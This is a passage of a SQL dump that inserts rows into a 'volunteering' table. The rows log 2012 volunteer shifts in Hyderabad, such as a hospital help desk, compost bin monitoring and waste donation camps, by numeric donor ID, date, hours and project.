(1006, '274', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1007, '176', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1008, '310', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1009, '313', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1010, '311', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1011, '368', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1012, '369', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1013, '276', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1014, '277', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1015, '278', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1016, '279', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1017, '257', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1018, '258', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1019, '260', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1020, '194', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1021, '198', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1022, '185', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1023, '186', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1024, '183', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1025, '184', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1026, '197', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1027, '362', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1028, '372', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1029, '377', '2012-09-13', '2012-09-13', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1030, '190', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1031, '170', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1032, '171', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1033, '203', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1034, '204', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1035, '328', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1036, '189', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1037, '320', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1038, '366', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1039, '265', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1040, '213', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1041, '358', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1042, '359', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1043, '212', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1044, '365', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1045, '364', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1046, '371', '2012-09-15', '2012-09-15', '09:30:00', '10:30:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1047, '276', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1048, '277', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1049, '278', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1050, '279', '2012-09-15', '2012-09-15', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1051, '235', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1052, '231', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1053, '218', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1054, '219', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1055, '308', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1056, '306', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1057, '309', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1058, '307', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1059, '276', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1060, '277', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1061, '278', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1062, '279', '2012-09-17', '2012-09-17', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1063, '269', '2012-09-18', '2012-09-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1064, '270', '2012-09-18', '2012-09-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1065, '272', '2012-09-18', '2012-09-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1066, '275', '2012-09-18', '2012-09-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1067, '373', '2012-09-18', '2012-09-18', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1068, '198', '2012-09-20', '2012-09-20', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1069, '257', '2012-09-20', '2012-09-20', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1070, '258', '2012-09-20', '2012-09-20', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1071, '260', '2012-09-20', '2012-09-20', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1072, '377', '2012-09-20', '2012-09-20', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1073, '310', '2012-09-21', '2012-09-21', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1074, '313', '2012-09-21', '2012-09-21', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1075, '311', '2012-09-21', '2012-09-21', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1076, '368', '2012-09-21', '2012-09-21', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1077, '369', '2012-09-21', '2012-09-21', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1078, '213', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1079, '364', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1080, '365', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1081, '366', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1082, '212', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1083, '276', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1084, '277', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1085, '278', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1086, '279', '2012-09-22', '2012-09-22', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'Monitoring compost bins at NTR and LUMBINI park', 'Onsite', 'Hyderabad', 'ADC', '', 7),
(1087, '114', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(1088, '124', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(1089, '82', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(1090, '85', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(1091, '84', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(1092, '384', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', NULL, '', 7),
(1093, '99', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', NULL, '', 7),
(1094, '100', '2012-09-30', '2012-09-30', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Hills Ridges Springs', 'Onsite', 'Hyderabad', NULL, '', 7),
(1095, '89', '2012-10-27', '2012-10-27', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Padmarao Nagar', 'Onsite', 'Hyderabad', NULL, '', 7),
(1096, '385', '2012-10-28', '2012-10-28', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', NULL, '', 7),
(1097, '99', '2012-10-28', '2012-10-28', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', NULL, '', 7),
(1098, '384', '2012-10-28', '2012-10-28', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', NULL, '', 7),
(1099, '137', '2012-10-28', '2012-10-28', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', NULL, '', 7),
(1100, '100', '2012-10-28', '2012-10-28', '10:00:00', '14:00:00', '4', 'Shram Daan', 'Environment', 'Organising Waste Donation camp at Gachibowli', 'Onsite', 'Hyderabad', NULL, '', 7),
(1101, '283', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1102, '282', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1103, '283', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1104, '363', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1105, '361', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1106, '306', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12);
INSERT INTO `volunteering` (`volunteer_act_id`, `donor_id`, `from_date`, `to_date`, `from_time`, `to_time`, `hours`, `donation_type`, `area`, `activity_done`, `onsite_offsite`, `location`, `organisation`, `notes`, `project_id`) VALUES
(1107, '307', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1108, '308', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1109, '218', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1110, '219', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1111, '220', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1112, '223', '2012-09-24', '2012-09-24', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'May I Help you desk at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1113, '227', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1114, '228', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1115, '232', '2012-09-01', '2012-09-01', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1116, '227', '2012-09-05', '2012-09-05', '10:00:00', '13:30:00', '3', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1117, '228', '2012-09-05', '2012-09-05', '10:00:00', '13:30:00', '3', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1118, '229', '2012-09-05', '2012-09-05', '10:00:00', '13:30:00', '3', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1119, '232', '2012-09-05', '2012-09-05', '10:00:00', '13:30:00', '3', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1120, '227', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1121, '228', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1122, '229', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1123, '232', '2012-09-07', '2012-09-07', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1124, '227', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1125, '228', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1126, '229', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1127, '232', '2012-09-12', '2012-09-12', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1128, '227', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1129, '228', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1130, '232', '2012-09-14', '2012-09-14', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1131, '227', '2012-09-21', '2012-09-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1132, '228', '2012-09-21', '2012-09-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1133, '229', '2012-09-21', '2012-09-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1134, '232', '2012-09-21', '2012-09-21', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1135, '227', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1136, '228', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1137, '229', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1138, '232', '2012-07-21', '2012-07-21', '10:00:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1139, '227', '2012-07-25', '2012-07-25', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1140, '228', '2012-07-25', '2012-07-25', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1141, '229', '2012-07-25', '2012-07-25', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1142, '232', '2012-07-25', '2012-07-25', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1143, '374', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1144, '375', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1145, '343', '2012-08-30', '2012-08-30', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1146, '339', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1147, '374', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1148, '375', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1149, '343', '2012-09-06', '2012-09-06', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
(1150, '375', '2012-09-10', '2012-09-10', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Data analysis at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ADC', '', 12),
